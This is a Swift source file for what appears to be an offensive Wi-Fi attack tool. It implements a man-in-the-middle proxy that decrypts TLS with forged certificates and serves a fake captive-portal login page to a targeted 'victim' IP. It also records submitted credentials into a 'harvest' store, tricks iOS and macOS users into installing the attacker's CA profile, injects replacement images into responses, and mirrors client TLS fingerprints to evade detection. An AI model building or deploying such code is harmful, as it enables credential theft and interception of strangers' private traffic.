import Foundation
import Network
import PastoralCore

/// Lobo-mode captive-portal target (see `TransparentProxy.portalRule`).
public struct PortalRule: Equatable, Sendable {
    public let targetIP: String
    /// The page served at `/__pastoral__/portal.html` (message or fake login).
    public let html: Data
    /// When non-nil, GET `/__pastoral__/ca.mobileconfig` serves this CA
    /// profile (the "trust trap" for iOS/macOS).
    public var caProfile: Data?
    public init(targetIP: String, html: Data, caProfile: Data? = nil) {
        self.targetIP = targetIP
        self.html = html
        self.caProfile = caProfile
    }
}

/// A transparent MITM proxy. Listens on 127.0.0.1:8080 and handles:
/// - Plain HTTP: parse request, forward to origin, capture request+response.
/// - CONNECT (TLS): if a CA is available, perform TLS interception (issue a
///   leaf cert for the SNI, terminate TLS, parse HTTP, forward to origin
///   over a new TLS connection, capture). Without a CA, tunnel through and
///   capture only the SNI.
///
/// Captured exchanges are reported via a callback. Thread-safe.
public final class TransparentProxy: @unchecked Sendable {
    public let port: UInt16
    public let onCapture: @Sendable (CapturedExchange) -> Void
    public var caManager: CAManager?
    /// The Wi-Fi network's SSID, stamped onto captured credentials so the
    /// harvest view can say where each login came from.
    public var portalSSID = ""
    /// Fired (on an arbitrary thread) whenever the fake-login form is
    /// submitted. The app records the credential in its harvest store.
    public var onCredential: (@Sendable (CapturedCredential) -> Void)?
    /// Content-injection engine. When set and enabled, eligible responses
    /// (image/*, optionally media) have their body swapped for the
    /// configured image before reaching the client. Hot-swappable — the
    /// app reconfigures it live without restarting the proxy.
    public var injection: InjectionEngine?

    /// Lobo-mode captive-portal rule: plain-HTTP requests whose client IP
    /// equals `targetIP` are answered locally instead of forwarded — OS
    /// connectivity probes get "offline", other GETs get redirected to
    /// our full-screen page. `nil` = portal off. Hot-swappable.
    public var portalRule: PortalRule? {
        get { portalLock.lock(); defer { portalLock.unlock() }; return _portalRule }
        set { portalLock.lock(); _portalRule = newValue; portalLock.unlock() }
    }
    private let portalLock = NSLock()
    private var _portalRule: PortalRule?
    /// Max bytes buffered while deciding/waiting to rewrite a response.
    /// Larger bodies fall back to streaming passthrough.
    public var maxRewriteBuffer = 25 * 1024 * 1024

    // MARK: - Diagnostics
    //
    // `onDiagnose` fires for every interception outcome (success and
    // failure). `diagLog` appends the same events as JSONL for
    // Scripts/diagnose.sh. `verboseDiagnostic` adds detail fields that
    // are skipped in normal mode to keep overhead ~zero.
    public var onDiagnose: (@Sendable (DiagEvent) -> Void)?
    public var diagLog: DiagLog?
    public var verboseDiagnostic = false
    /// When true, the origin-facing TLS connection mirrors the victim's
    /// ClientHello (version range, cipher list order, groups) so the
    /// server sees a client-like fingerprint instead of the macOS
    /// Secure Transport default. Extension order can't be controlled
    /// through sec_protocol_options — documented limitation.
    public var mirrorClientFingerprint = true

    func emitDiag(_ event: DiagEvent) {
        diagLog?.record(event)
        onDiagnose?(event)
    }

    private var listener: NWListener?
    private var running = false
    private let lifecycleLock = NSLock()
    let queue = DispatchQueue(label: "com.pastoral.proxy")

    /// Internal TLS listeners spawned per intercepted connection. Each
    /// terminates TLS with the leaf identity for that connection's SNI.
    /// Internal for the TLSInterceptor extension.
    var tlsListeners: [NWListener] = []
    let tlsListenerLock = NSLock()

    public init(port: UInt16 = 8080,
                caManager: CAManager? = nil,
                onCapture: @escaping @Sendable (CapturedExchange) -> Void) {
        self.port = port
        self.caManager = caManager
        self.onCapture = onCapture
    }

    /// Startup succeeds only after the local listener reports readiness.
    public func start() async throws {
        if isRunning { return }
        let params = NWParameters.tcp
        params.requiredLocalEndpoint = .hostPort(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: port)!)
        let candidate = try NWListener(using: params)
        let reserved = lifecycleLock.withLock {
            guard listener == nil else { return false }
            listener = candidate
            return true
        }
        guard reserved else { throw ProxyStartupError.alreadyStarting }
        candidate.newConnectionHandler = { [weak self] conn in
            self?.handleConnection(conn)
        }
        do {
            try await withCheckedThrowingContinuation { (continuation: CheckedContinuation<Void, Error>) in
                let completion = ProxyStartCompletion(continuation)
                candidate.stateUpdateHandler = { [weak self] state in
                    guard let self else {
                        completion.finish(.failure(ProxyStartupError.cancelled))
                        return
                    }
                    switch state {
                    case .ready:
                        let current = self.lifecycleLock.withLock {
                            guard self.listener === candidate else { return false }
                            self.running = true
                            return true
                        }
                        completion.finish(current ? .success(()) : .failure(ProxyStartupError.cancelled))
                    case .failed(let error):
                        self.clearListener(candidate)
                        completion.finish(.failure(error))
                        candidate.cancel()
                    case .cancelled:
                        self.clearListener(candidate)
                        completion.finish(.failure(ProxyStartupError.cancelled))
                    default: break
                    }
                }
                queue.asyncAfter(deadline: .now() + 5) { [weak self] in
                    if completion.finish(.failure(ProxyStartupError.timedOut)) {
                        self?.clearListener(candidate)
                        candidate.cancel()
                    }
                }
                candidate.start(queue: queue)
            }
        } catch {
            clearListener(candidate)
            candidate.cancel()
            throw error
        }
    }

    private func clearListener(_ candidate: NWListener) {
        lifecycleLock.withLock {
            if listener === candidate { listener = nil; running = false }
        }
    }

    public func stop() {
        let current = lifecycleLock.withLock {
            let current = listener
            listener = nil
            running = false
            return current
        }
        current?.cancel()
        tlsListenerLock.lock()
        tlsListeners.forEach { $0.cancel() }
        tlsListeners.removeAll()
        tlsListenerLock.unlock()
    }

    public var isRunning: Bool { lifecycleLock.withLock { running } }

    // MARK: - Connection handling

    private func handleConnection(_ clientConn: NWConnection) {
        clientConn.start(queue: queue)
        clientConn.receive(minimumIncompleteLength: 1, maximumLength: 65536) {
            [weak self] data, _, isComplete, error in
            guard let self, let data, error == nil else {
                clientConn.cancel()
                return
            }
            if data.starts(with: "CONNECT ".utf8) {
                self.handleConnect(clientConn: clientConn, initialData: data)
            } else if self.looksLikeTLS(data) {
                // Transparently-redirected (rdr) TLS: the client opens a
                // TLS handshake directly — no CONNECT. Terminate it.
                self.interceptTLS(clientConn: clientConn, initialData: data,
                                  originHint: nil)
            } else {
                self.handlePlainHTTP(clientConn: clientConn, initialData: data)
            }
            _ = isComplete
        }
    }

    // MARK: - Plain HTTP

    /// Parse an HTTP request and forward it to the origin. When `tlsOrigin`
    /// is set the request came from a decrypted TLS stream — connect to the
    /// SNI on 443 over TLS and use the real victim IP for scoping.
    func handlePlainHTTP(clientConn: NWConnection, initialData: Data,
                         tlsOrigin: (sni: String, clientIP: String?,
                                     hello: ClientHelloInfo?,
                                     probe: TLSHandshakeProbe?)? = nil) {
        guard let parsed = HTTPRequestParser.parse(initialData) else {
            // h2 prior-knowledge preface in plaintext, or a client that
            // ignored our http/1.1-only ALPN — log and drop.
            if initialData.starts(with: "PRI * HTTP/2.0".utf8) {
                emitDiag(DiagEvent(
                    clientIP: tlsOrigin?.clientIP ?? clientIP(of: clientConn),
                    sni: tlsOrigin?.sni, outcome: "h2_preface",
                    detail: "cliente falou h2 sem ALPN",
                    category: .http2Reset))
            } else if tlsOrigin != nil {
                // Decrypted stream that isn't HTTP — shouldn't happen,
                // but log it as an interception anomaly.
                emitDiag(DiagEvent(
                    clientIP: tlsOrigin?.clientIP, sni: tlsOrigin?.sni,
                    outcome: "decrypted_not_http",
                    detail: "\(initialData.prefix(16).map { String(format: "%02x", $0) }.joined())",
                    category: .other))
            }
            tlsOrigin?.probe?.handshakeSucceeded()
            clientConn.cancel()
            return
        }
        tlsOrigin?.probe?.handshakeSucceeded()

        let host = tlsOrigin?.sni ?? parsed.host ?? "unknown"
        let method = parsed.method
        let path = parsed.path

        // Lobo mode: the fake-login form POSTs its credentials to us —
        // buffer the body (it may still be in flight) and answer locally.
        if tlsOrigin == nil,
           let ip = clientIP(of: clientConn),
           let rule = portalRule, ip == rule.targetIP,
           method.uppercased() == "POST", path.hasPrefix(CredentialPortal.credPath) {
            self.handleCredPost(clientConn: clientConn, initialData: initialData,
                                headers: parsed.headers, clientIP: ip)
            return
        }

        // Lobo mode: capture-portal interception for the targeted client.
        // Only plaintext flows reach this point with tlsOrigin nil —
        // captured HTTPS (CA MITM) keeps flowing through normally.
        if tlsOrigin == nil,
           let ip = clientIP(of: clientConn),
           handlePortal(conn: clientConn, clientIP: ip,
                        method: method, host: host, path: path) {
            return
        }

        // Determine the origin port: 443 for decrypted TLS, else the Host
        // header's port (default 80).
        let originPort: UInt16
        if tlsOrigin != nil {
            originPort = 443
        } else if let hostHeader = parsed.headers["Host"] ?? parsed.headers["host"],
           let colonIdx = hostHeader.lastIndex(of: ":"),
           let p = UInt16(hostHeader[hostHeader.index(after: colonIdx)...]) {
            originPort = p
        } else {
            originPort = 80
        }

        // The request body may still be in flight — gather it before
        // forwarding or the origin sees a truncated request. Content-Length
        // gives an exact size; a chunked body is complete once every frame
        // ("hex-size\r\ndata\r\n") parses including the zero-size terminator.
        let te = (parsed.headers["Transfer-Encoding"]
            ?? parsed.headers["transfer-encoding"] ?? "").lowercased()
        let isChunked = te.contains("chunked")
        let contentLength = isChunked ? 0
            : (Int(parsed.headers["Content-Length"]
                ?? parsed.headers["content-length"] ?? "0") ?? 0)
        let headerEnd = HTTPRequestParser.findHeaderEnd(in: initialData) ?? initialData.count
        let bodyOffset = headerEnd + 4
        var pending = initialData
        func bodyComplete() -> Bool {
            let received = max(0, pending.count - bodyOffset)
            if isChunked {
                return Self.chunkedFramingComplete(
                    in: Array(pending.suffix(from: bodyOffset)))
            }
            return received >= contentLength
        }
        if bodyComplete() {
            forwardPlainHTTP(clientConn: clientConn, data: initialData,
                             host: host, originPort: originPort,
                             method: method, path: path,
                             requestHeaders: parsed.headers,
                             originTLS: tlsOrigin != nil, sni: tlsOrigin?.sni,
                             victimIP: tlsOrigin?.clientIP,
                             hello: tlsOrigin?.hello)
        } else {
            func receiveMore() {
                clientConn.receive(minimumIncompleteLength: 1,
                                   maximumLength: 65536) {
                    [weak self] d, _, isComplete, error in
                    guard let self else { return }
                    if let d, !d.isEmpty { pending.append(d) }
                    if bodyComplete() || isComplete || error != nil {
                        // Closed mid-body: forward what arrived rather
                        // than stall the response forever.
                        self.forwardPlainHTTP(clientConn: clientConn,
                                              data: pending,
                                              host: host,
                                              originPort: originPort,
                                              method: method, path: path,
                                              requestHeaders: parsed.headers,
                                              originTLS: tlsOrigin != nil,
                                              sni: tlsOrigin?.sni,
                                              victimIP: tlsOrigin?.clientIP,
                                              hello: tlsOrigin?.hello)
                    } else {
                        receiveMore()
                    }
                }
            }
            receiveMore()
        }
    }

    /// Lobo-mode captive-portal response. Returns true when the request
    /// was consumed locally (no origin round-trip happened):
    /// - OS connectivity probe → 200 with a body that is NOT the magic
    ///   string the OS expects ("offline" → browser gets force-opened);
    /// - our page path → the configured HTML, full screen;
    /// - any other GET/HEAD → 302 to the page (relative, same origin);
    /// - POST/PUT/etc. pass through untouched (don't break forms).
    func handlePortal(conn: NWConnection, clientIP: String,
                      method: String, host: String, path: String) -> Bool {
        guard let rule = portalRule, clientIP == rule.targetIP else { return false }

        func reply(_ status: Int, contentType: String, data: Data,
                   extraHeaders: [(String, String)] = []) {
            var lines = ["Content-Type: \(contentType)",
                         "Content-Length: \(data.count)",
                         "Connection: close"]
            lines += extraHeaders.map { "\($0.0): \($0.1)" }
            let reason: String = switch status {
            case 200: "OK"
            case 302: "Found"
            case 404: "Not Found"
            default: "OK"
            }
            let head = "HTTP/1.1 \(status) \(reason)\r\n\(lines.joined(separator: "\r\n"))\r\n\r\n"
            conn.send(content: Data(head.utf8) + data, completion: .contentProcessed { [weak self] _ in
                self?.emitDiag(DiagEvent(
                    clientIP: clientIP, sni: host,
                    outcome: status == 200 && PortalPage.isCaptiveCheck(host: host, path: path)
                        ? "portal_captive" : "portal_hijack",
                    detail: "\(method) \(path)", category: .other))
                conn.cancel()
            })
        }

        if PortalPage.isCaptiveCheck(host: host, path: path) {
            reply(200, contentType: "text/plain; charset=utf-8",
                  data: Data(PortalPage.offlineBody.utf8))
            return true
        }
        if path.hasPrefix(PortalPage.pagePath) {
            reply(200, contentType: "text/html; charset=utf-8", data: rule.html)
            return true
        }
        // The CA trust trap: iOS/macOS profile installer.
        if method == "GET" || method == "HEAD", Self.cleanPath(path) == CredentialPortal.caProfilePath {
            if let profile = rule.caProfile, !profile.isEmpty {
                reply(200,
                      contentType: "application/x-apple-asymmetric-config",
                      data: profile,
                      extraHeaders: [("Content-Disposition",
                                      "attachment; filename=pastoral-wifi.mobileconfig")])
            } else {
                reply(404, contentType: "text/plain", data: Data())
            }
            return true
        }
        if method == "GET" || method == "HEAD" {
            reply(302, contentType: "text/plain",
                  data: Data(), extraHeaders: [("Location", PortalPage.pagePath)])
            return true
        }
        return false
    }

    /// Strip a query string off a request path.
    static func cleanPath(_ path: String) -> String {
        guard let q = path.firstIndex(of: "?") else { return path }
        return String(path[..<q])
    }

    /// The fake-login form landed: buffer the request body, record the
    /// credential, and answer with the "conectando…" success page. The
    /// form is our own, so it is always x-www-form-urlencoded with a
    /// Content-Length — no chunked handling needed here.
    func handleCredPost(clientConn: NWConnection, initialData: Data,
                        headers: [String: String], clientIP: String) {
        let contentLength = Int(headers["Content-Length"]
                                ?? headers["content-length"] ?? "0") ?? 0
        let headerEnd = HTTPRequestParser.findHeaderEnd(in: initialData) ?? initialData.count
        let bodyOffset = headerEnd + 4
        var pending = initialData

        func deliver() {
            let body = pending.count > bodyOffset
                ? Data(pending.suffix(from: bodyOffset)) : Data()
            var user = ""
            var pass = ""
            var page = ""
            if let f = CredentialPortal.parseFormBody(body) {
                user = f.user; pass = f.pass; page = f.page
            }
            // Record twice: once in the structured harvest store (via the
            // callback), once in the normal request log so the Sheep tab
            // shows the hit like any other capture.
            let cred = CapturedCredential(user: user, pass: pass, ssid: portalSSID,
                                          sourceIP: clientIP, page: page,
                                          timestamp: Date())
            onCredential?(cred)
            onCapture(CapturedExchange(
                host: "pastoral-portal", method: "POST", path: CredentialPortal.credPath,
                requestHeaders: ["Content-Type": "application/x-www-form-urlencoded"],
                requestBody: body, status: 200,
                responseHeaders: ["Content-Type": "text/html; charset=utf-8"],
                responseBody: nil, isTLS: false, sni: "pastoral-portal"))
            emitDiag(DiagEvent(clientIP: clientIP, sni: nil,
                               outcome: "cred_harvested",
                               detail: "user=\(user.isEmpty ? "?" : user) page=\(page)",
                               category: .other))
            let html = CredentialPortal.successHTML()
            let head = "HTTP/1.1 200 OK\r\n"
                     + "Content-Type: text/html; charset=utf-8\r\n"
                     + "Content-Length: \(html.utf8.count)\r\n"
                     + "Connection: close\r\n\r\n"
            clientConn.send(content: Data(head.utf8) + Data(html.utf8),
                            completion: .contentProcessed { _ in clientConn.cancel() })
        }

        if max(0, pending.count - bodyOffset) >= contentLength {
            deliver()
            return
        }
        var delivered = false
        func receiveMore() {
            clientConn.receive(minimumIncompleteLength: 1, maximumLength: 65536) {
                [weak self] d, _, isComplete, error in
                guard let self else { return }
                if let d, !d.isEmpty { pending.append(d) }
                if delivered { return }
                if max(0, pending.count - bodyOffset) >= contentLength
                    || isComplete || error != nil {
                    delivered = true
                    deliver()
                } else {
                    receiveMore()
                }
            }
        }
        receiveMore()
    }

    /// True when the chunked-body framing in `body` is complete: every
    /// "hex-size\r\n<data>\r\n" frame parses and a zero-size terminator
    /// ("0\r\n" plus its trailing CRLF) is present. Trailer lines are
    /// rare; if some arrive later they ride along forwarded verbatim.

    static func chunkedFramingComplete(in body: [UInt8]) -> Bool {
        var pos = 0
        while true {
            // Find the end of the size line.
            var eol = pos
            while eol + 1 < body.count && !(body[eol] == 0x0D && body[eol + 1] == 0x0A) {
                eol += 1
            }
            if eol + 1 >= body.count { return false }   // no \r\n yet
            let sizeField = String(decoding: body[pos..<eol], as: UTF8.self)
                .split(separator: ";").first.map(String.init)?
                .trimmingCharacters(in: .whitespaces) ?? ""
            guard let size = UInt64(sizeField, radix: 16) else { return false }
            let dataStart = eol + 2
            if size == 0 {
                return dataStart + 2 <= body.count     // terminator + CRLF
            }
            let frameEnd = dataStart + Int(size) + 2   // data + \r\n
            guard frameEnd <= body.count else { return false }
            pos = frameEnd
        }
    }

    /// The victim's source IP for a connection accepted via pf rdr — the
    /// remote endpoint is the client, since rdr only rewrites the
    /// destination. Used by injection rules scoped to specific targets.
    func clientIP(of conn: NWConnection) -> String? {
        guard case .hostPort(let host, _) = conn.endpoint else { return nil }
        switch host {
        case .ipv4(let a): return "\(a)"
        case .ipv6(let a): return "\(a)"
        case .name(let n, _): return n
        default: return "\(host)"
        }
    }

    func forwardPlainHTTP(clientConn: NWConnection, data: Data,
                          host: String, originPort: UInt16,
                          method: String, path: String,
                          requestHeaders: [String: String],
                          originTLS: Bool = false, sni: String? = nil,
                          victimIP: String? = nil,
                          hello: ClientHelloInfo? = nil) {
        let params: NWParameters = originTLS
            ? Self.originTLSParameters(mirroring: mirrorClientFingerprint ? hello : nil)
            : .tcp
        let originConn = NWConnection(
            host: NWEndpoint.Host(host),
            port: NWEndpoint.Port(integerLiteral: originPort),
            using: params
        )
        originConn.start(queue: queue)

        originConn.send(content: data, completion: .contentProcessed { [weak self] error in
            guard let self else { return }
            if error != nil {
                clientConn.cancel()
                originConn.cancel()
                return
            }
            self.readResponse(originConn: originConn, clientConn: clientConn,
                              host: host, method: method, path: path,
                              requestHeaders: requestHeaders,
                              isTLS: originTLS, sni: sni,
                              clientIP: victimIP ?? self.clientIP(of: clientConn))
        })
    }

    // MARK: - CONNECT (TLS tunnel)

    private func handleConnect(clientConn: NWConnection, initialData: Data) {
        guard let parsed = HTTPRequestParser.parse(initialData),
              parsed.method == "CONNECT" else {
            clientConn.cancel()
            return
        }

        let hostPort = parsed.path
        let parts = hostPort.split(separator: ":")
        let host = String(parts.first ?? "")
        let port = parts.count >= 2 ? UInt16(parts[1]) ?? 443 : 443

        // Read the ClientHello *before* announcing anything. Sending
        // "200 Connection Established" up front would commit this flow to
        // the tunnel even when the origin never answers, and the victim
        // would see a half-open connection instead of a clean failure.
        // interceptTLS announces the 200 (or a 502) once it actually knows
        // whether the flow can go through — and replays the ClientHello
        // upstream, which a naive pump would lose.
        clientConn.receive(minimumIncompleteLength: 1, maximumLength: 65536) {
            [weak self] data, _, _, error in
            guard let self, let data, error == nil else {
                clientConn.cancel()
                return
            }
            self.interceptTLS(clientConn: clientConn, initialData: data,
                              originHint: (host: host, port: port),
                              requestHeaders: parsed.headers)
        }
    }

    /// Extract the SNI (Server Name Indication) from a TLS ClientHello record.
    /// Returns the hostname if found, nil otherwise.
    func extractSNI(from data: Data) -> String? {
        // TLS record: type(1) version(2) length(2) handshake...
        guard data.count >= 5, data[0] == 0x16 else { return nil }  // 0x16 = Handshake
        // Handshake: type(1) length(3) version(2) random(32) session_id...
        let hsStart = 5
        guard data.count > hsStart + 4, data[hsStart] == 0x01 else { return nil }  // 0x01 = ClientHello
        var pos = hsStart + 4 + 2 + 32  // skip type, length, version, random
        guard pos < data.count else { return nil }
        // Session ID
        let sessionIdLen = Int(data[pos])
        pos += 1 + sessionIdLen
        guard pos + 2 <= data.count else { return nil }
        // Cipher suites
        let cipherLen = Int(data[pos]) << 8 | Int(data[pos + 1])
        pos += 2 + cipherLen
        guard pos < data.count else { return nil }
        // Compression methods
        let compLen = Int(data[pos])
        pos += 1 + compLen
        guard pos + 2 <= data.count else { return nil }
        // Extensions
        let extLen = Int(data[pos]) << 8 | Int(data[pos + 1])
        pos += 2
        let extEnd = pos + extLen
        guard extEnd <= data.count else { return nil }

        while pos + 4 <= extEnd {
            let extType = Int(data[pos]) << 8 | Int(data[pos + 1])
            let extDataLen = Int(data[pos + 2]) << 8 | Int(data[pos + 3])
            pos += 4
            if extType == 0x0000 {  // server_name extension
                // server_name list: type(1) name_len(2) name...
                guard pos + 3 <= extEnd else { return nil }
                let nameType = data[pos]
                if nameType == 0x00 {  // host_name
                    let nameLen = Int(data[pos + 1]) << 8 | Int(data[pos + 2])
                    let nameStart = pos + 3
                    guard nameStart + nameLen <= data.count else { return nil }
                    return String(data: data.subdata(in: nameStart..<(nameStart + nameLen)),
                                  encoding: .utf8)
                }
            }
            pos += extDataLen
        }
        return nil
    }

    func tunnel(clientConn: NWConnection, originConn: NWConnection) {
        forwardData(from: clientConn, to: originConn)
        forwardData(from: originConn, to: clientConn)
    }

    func forwardData(from: NWConnection, to: NWConnection,
                     inspect: ((Data) -> Void)? = nil) {
        from.receive(minimumIncompleteLength: 1, maximumLength: 65536) {
            data, _, isComplete, error in
            if let data, !data.isEmpty {
                inspect?(data)
                to.send(content: data, completion: .contentProcessed { _ in })
            }
            if isComplete || error != nil {
                from.cancel()
                to.cancel()
            } else {
                self.forwardData(from: from, to: to, inspect: inspect)
            }
        }
    }

    /// TLS parameters for the origin-facing connection. ALPN is pinned to
    /// http/1.1 — we only speak HTTP/1.1 upstream so the decrypted stream
    /// stays parseable (the HTTP/2 frame parser is decode-only).
    ///
    /// When `hello` is given, the origin-side handshake mirrors the
    /// victim's ClientHello as far as sec_protocol_options allows: TLS
    /// version range and the cipher-suite list in client order (GREASE
    /// stripped). What we cannot mirror: extension order, extensions
    /// Secure Transport doesn't expose, and ALPN (always http/1.1 —
    /// offering h2 upstream would deliver frames our parser can't read).
    static func originTLSParameters(mirroring hello: ClientHelloInfo? = nil) -> NWParameters {
        let tls = NWProtocolTLS.Options()
        let opts = tls.securityProtocolOptions

        if let hello {
            // Version range the client offered.
            if let minV = tlsVersion(hello.minVersion) {
                sec_protocol_options_set_min_tls_protocol_version(opts, minV)
            }
            if let maxV = tlsVersion(hello.maxVersion) {
                sec_protocol_options_set_max_tls_protocol_version(opts, maxV)
            }
            // Cipher suites in the client's own order (GREASE out).
            for c in hello.cipherSuites where !ClientHelloInfo.isGREASE(c) {
                if let suite = tls_ciphersuite_t(rawValue: c) {
                    sec_protocol_options_append_tls_ciphersuite(opts, suite)
                }
            }
        }

        sec_protocol_options_add_tls_application_protocol(opts, "http/1.1")
        return NWParameters(tls: tls)
    }

    /// Map a wire TLS version (0x0301..0x0304) to tls_protocol_version_t.
    static func tlsVersion(_ v: UInt16) -> tls_protocol_version_t? {
        switch v {
        case 0x0301: return .TLSv10
        case 0x0302: return .TLSv11
        case 0x0303: return .TLSv12
        case 0x0304: return .TLSv13
        default: return nil
        }
    }

    // MARK: - Response reading

    /// Read the origin's response. When the injection engine is enabled and
    /// the response is eligible (image/* or media per the rule), the full
    /// body is buffered and swapped for the injected image before being
    /// sent to the client. Ineligible responses stream through unchanged.
    private func readResponse(originConn: NWConnection, clientConn: NWConnection,
                              host: String, method: String, path: String,
                              requestHeaders: [String: String],
                              isTLS: Bool, sni: String?, clientIP: String?) {
        let buffer = ResponseBuffer()
        var decided = false        // head parsed → rewrite-or-stream decided
        var rewriting = false
        var captured = false
        let maxBuffer = self.maxRewriteBuffer

        func capture(status: Int?, headers: [String: String],
                     body: Data?, rewritten: Bool) {
            self.onCapture(CapturedExchange(
                host: host, method: method, path: path,
                requestHeaders: requestHeaders,
                status: status, responseHeaders: headers,
                responseBody: body, isTLS: isTLS, sni: sni,
                wasRewritten: rewritten))
        }

        func closeBoth() {
            clientConn.cancel()
            originConn.cancel()
        }

        func pump() {
            originConn.receive(minimumIncompleteLength: 1, maximumLength: 65536) {
                [weak self] data, _, isComplete, error in
                guard let self else { return }
                guard let data, error == nil else {
                    closeBoth()
                    return
                }
                buffer.append(data)

                // Decide once the response head is complete.
                var chunkFlushed = false
                if !decided && buffer.headComplete {
                    decided = true
                    buffer.noteRequestMethod(method)
                    rewriting = self.injection?.shouldRewrite(
                        clientIP: clientIP, host: host, path: path,
                        responseHeaders: buffer.head!.headers) ?? false
                    if !rewriting {
                        clientConn.send(content: buffer.raw,
                                        completion: .contentProcessed { _ in })
                        chunkFlushed = true
                        if let head = buffer.head {
                            capture(status: head.status, headers: head.headers,
                                    body: buffer.bodyBytes, rewritten: false)
                            captured = true
                        }
                    }
                }

                if !decided {
                    // Still waiting for a parseable response head.
                    if isComplete {
                        clientConn.send(content: buffer.raw,
                                        completion: .contentProcessed { _ in })
                        if !captured {
                            capture(status: nil, headers: [:], body: nil,
                                    rewritten: false)
                        }
                        closeBoth()
                    } else {
                        pump()
                    }
                    return
                }

                if rewriting {
                    if buffer.raw.count > maxBuffer {
                        // Body too big to buffer — flush as passthrough.
                        rewriting = false
                        clientConn.send(content: buffer.raw,
                                        completion: .contentProcessed { _ in })
                        chunkFlushed = true
                    } else if buffer.isComplete(eof: isComplete) {
                        let out = self.injection?.rewrite(
                            clientIP: clientIP, host: host, path: path,
                            buffer: buffer)
                        let rewritten = out != nil
                        clientConn.send(content: out ?? buffer.raw,
                                        completion: .contentProcessed { _ in
                            closeBoth()
                        })
                        if let head = buffer.head {
                            capture(status: head.status, headers: head.headers,
                                    body: buffer.decodedBody,
                                    rewritten: rewritten)
                        }
                        return
                    } else if isComplete {
                        // Origin closed before the body completed — forward
                        // what arrived rather than hang.
                        clientConn.send(content: buffer.raw,
                                        completion: .contentProcessed { _ in
                            closeBoth()
                        })
                        if let head = buffer.head, !captured {
                            capture(status: head.status, headers: head.headers,
                                    body: buffer.bodyBytes, rewritten: false)
                        }
                        return
                    } else {
                        pump()
                        return
                    }
                }

                // Passthrough stream: the deciding chunk was already flushed
                // as part of buffer.raw; later chunks forward verbatim.
                if !chunkFlushed {
                    clientConn.send(content: data,
                                    completion: .contentProcessed { _ in })
                }
                if isComplete {
                    if !captured {
                        capture(status: buffer.head?.status,
                                headers: buffer.head?.headers ?? [:],
                                body: buffer.decodedBody, rewritten: false)
                    }
                    closeBoth()
                } else {
                    pump()
                }
            }
        }
        pump()
    }
}

private enum ProxyStartupError: Error {
    case alreadyStarting, cancelled, timedOut
}

/// Network callbacks and startup deadline may race; resume exactly once.
private final class ProxyStartCompletion: @unchecked Sendable {
    private let lock = NSLock()
    private var continuation: CheckedContinuation<Void, Error>?
    init(_ continuation: CheckedContinuation<Void, Error>) { self.continuation = continuation }
    @discardableResult
    func finish(_ result: Result<Void, Error>) -> Bool {
        let pending = lock.withLock {
            let pending = continuation
            continuation = nil
            return pending
        }
        guard let pending else { return false }
        pending.resume(with: result)
        return true
    }
}
